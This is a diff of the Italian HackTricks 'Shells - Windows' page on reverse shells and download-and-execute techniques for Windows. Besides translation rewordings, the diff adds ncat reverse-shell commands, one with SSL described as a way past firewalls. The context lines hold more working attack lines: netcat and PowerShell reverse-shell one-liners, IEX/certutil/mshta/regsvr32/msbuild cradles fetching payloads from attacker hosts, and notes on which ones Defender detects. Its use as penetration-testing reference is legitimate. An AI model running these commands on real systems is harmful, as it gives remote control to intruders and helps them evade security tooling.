@@ -1,16 +1,16 @@
 # Shells - Windows
 
 {% hint style="success" %}
-Impara & pratica l'Hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara & pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Sostieni HackTricks</summary>
+<summary>Supporta HackTricks</summary>
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
 {% endhint %}
@@ -26,15 +26,28 @@ Impara & pratica l'Hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 ## Lolbas
 
 La pagina [lolbas-project.github.io](https://lolbas-project.github.io/) è per Windows come [https://gtfobins.github.io/](https://gtfobins.github.io/) è per linux.\
-Ovviamente, **non ci sono file SUID o privilegi sudo in Windows**, ma è utile sapere **come** alcuni **binari** possono essere (ab)usati per eseguire alcuni tipi di azioni inaspettate come **eseguire codice arbitrario.**
+Ovviamente, **non ci sono file SUID o privilegi sudo in Windows**, ma è utile sapere **come** alcuni **binaries** possono essere (ab)usati per eseguire qualche tipo di azioni inaspettate come **eseguire codice arbitrario.**
 
 ## NC
 ```bash
 nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
+## NCAT
+vittima
+```
+ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
+#Encryption to bypass firewall
+ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
+```
+attaccante
+```
+ncat -l <PORT>
+#Encryption to bypass firewall
+ncat -l <PORT eg.443> --ssl
+```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi simili a Unix e Win32. Con funzionalità come crittografia forte, esecuzione di programmi, porte di origine personalizzabili e riconnessione continua, sbd fornisce una soluzione versatile per la comunicazione TCP/IP. Per gli utenti di Windows, la versione sbd.exe della distribuzione Kali Linux può essere utilizzata come affidabile sostituto di Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) è un'alternativa portatile e sicura a Netcat**. Funziona su sistemi simili a Unix e Win32. Con funzionalità come crittografia forte, esecuzione di programmi, porte sorgente personalizzabili e riconnessione continua, sbd offre una soluzione versatile per la comunicazione TCP/IP. Per gli utenti Windows, la versione sbd.exe della distribuzione Kali Linux può essere utilizzata come un sostituto affidabile di Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -88,19 +101,19 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Process che esegue la chiamata di rete: **powershell.exe**\
-Payload scritto su disco: **NO** (_almeno da nessuna parte che potessi trovare usando procmon!_)
+Processo che esegue la chiamata di rete: **powershell.exe**\
+Payload scritto su disco: **NO** (_almeno da nessuna parte che io possa trovare usando procmon !_ )
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Process che effettua chiamata di rete: **svchost.exe**\
-Payload scritto su disco: **cache locale del client WebDAV**
+Processo che esegue una chiamata di rete: **svchost.exe**\
+Payload scritto su disco: **WebDAV client local cache**
 
-**Una riga:**
+**One liner:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-**Ottieni ulteriori informazioni su diversi Shells di Powershell alla fine di questo documento**
+**Ottieni ulteriori informazioni su diversi shell di Powershell alla fine di questo documento**
 
 ## Mshta
 
@@ -116,13 +129,13 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Esempio di shell inversa hta-psh (utilizza hta per scaricare ed eseguire il backdoor di PS)**
+#### **Esempio di reverse shell hta-psh (usa hta per scaricare ed eseguire il backdoor PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**È possibile scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager hta**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager hta**
 
-#### Esempio hta
+#### esempio hta
 
 [**Da qui**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
@@ -168,14 +181,14 @@ msf exploit(windows/misc/hta_server) > exploit
 ```bash
 Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
 ```
-**Rilevato da Defender**
+**Rilevato dal difensore**
 
 
 
 
 ## **Rundll32**
 
-[**Esempio di Dll hello world**](https://github.com/carterjones/hello-world-dll)
+[**Esempio di dll hello world**](https://github.com/carterjones/hello-world-dll)
 
 * [Da qui](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -229,7 +242,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Rilevato dal difensore**
+**Rilevato da defender**
 
 #### Regsvr32 -sct
 
@@ -259,7 +272,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**È possibile scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager regsvr**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando il stager regsvr**
 
 ## Certutil
 
@@ -273,7 +286,7 @@ Scarica un B64exe, decodificalo ed eseguilo.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Rilevato da Defender**
+**Rilevato da defender**
 
 
 ## **Cscript/Wscript**
@@ -284,14 +297,14 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Rilevato da Defender**
+**Rilevato dal difensore**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Process che effettua chiamata di rete: **svchost.exe**\
-Payload scritto su disco: **cache locale del client WebDAV**
+Processo che esegue la chiamata di rete: **svchost.exe**\
+Payload scritto su disco: **WebDAV client local cache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
 impacket-smbserver -smb2support kali `pwd`
@@ -335,7 +348,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Non rilevato**
 
-**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando lo stager wmic**
+**Puoi scaricare ed eseguire molto facilmente uno zombie Koadic utilizzando il stager wmic**
 
 ## Msbuild
 
@@ -343,7 +356,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
 ```
-Puoi utilizzare questa tecnica per bypassare la lista bianca dell'applicazione e le restrizioni di Powershell.exe. Poiché ti verrà richiesto di inserire una shell di PS.\
+Puoi utilizzare questa tecnica per bypassare le restrizioni di Application Whitelisting e Powershell.exe. Sarai presentato con una shell PS.\
 Basta scaricare questo ed eseguirlo: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
@@ -352,11 +365,11 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 
 ## **CSC**
 
-Compilare il codice C# nella macchina vittima.
+Compila il codice C# nella macchina vittima.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Puoi scaricare una shell inversa di base in C# da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Puoi scaricare una shell inversa C# di base da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Non rilevato**
 
@@ -380,37 +393,37 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 
 [**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)
 
-## Shell di Powershell
+## Shells di Powershell
 
 ### PS-Nishang
 
 [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)
 
-Nella cartella **Shells**, ci sono molti shell diversi. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_ fare una copia dello script e aggiungere alla fine del file:
+Nella cartella **Shells**, ci sono molte shell diverse. Per scaricare ed eseguire Invoke-_PowerShellTcp.ps1_, fai una copia dello script e aggiungi alla fine del file:
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Inizia a servire lo script su un server web ed eseguilo sul computer della vittima:
+Inizia a servire lo script in un server web ed eseguilo dalla parte della vittima:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
-Defender non lo rileva come codice maligno (ancora, 3/04/2019).
+Defender non lo rileva come codice malevolo (ancora, 3/04/2019).
 
-**TODO: Controllare altre shell nishang**
+**TODO: Controlla altre shell nishang**
 
 ### **PS-Powercat**
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Scarica, avvia un server web, avvia il listener ed eseguilo sul computer della vittima:
+Scarica, avvia un server web, avvia il listener ed eseguilo sul lato della vittima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender non lo rileva come codice dannoso (ancora, 3/04/2019).
+Defender non lo rileva come codice malevolo (ancora, 03/04/2019).
 
 **Altre opzioni offerte da powercat:**
 
-Shell di bind, Shell inversa (TCP, UDP, DNS), Reindirizzamento di porta, upload/download, Generare payload, Servire file...
+Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -431,17 +444,17 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Crea un lanciatore powershell, salvatelo in un file e scaricalo ed eseguilo.
+Crea un launcher di powershell, salvalo in un file e scaricalo ed eseguilo.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Rilevato come codice maligno**
+**Rilevato come codice malevolo**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Crea una versione in powershell della backdoor di metasploit utilizzando unicorn
+Crea una versione powershell del backdoor di metasploit utilizzando unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -453,11 +466,11 @@ Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nella vi
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Rilevato come codice maligno**
+**Rilevato come codice malevolo**
 
-## Altro
+## Maggiori informazioni
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) console PS con alcuni moduli PS offensivi precaricati (cifrati)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) console PS con alcuni moduli PS offensivi pre-caricati (cifrati)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli PS offensivi e rilevamento proxy (IEX)
 
@@ -478,16 +491,16 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli P
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-Impara e pratica l'hacking su AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Impara e pratica l'hacking su GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Impara e pratica il hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica il hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Sostieni HackTricks</summary>
+<summary>Supporta HackTricks</summary>
 
 * Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.
 
 </details>
 {% endhint %}
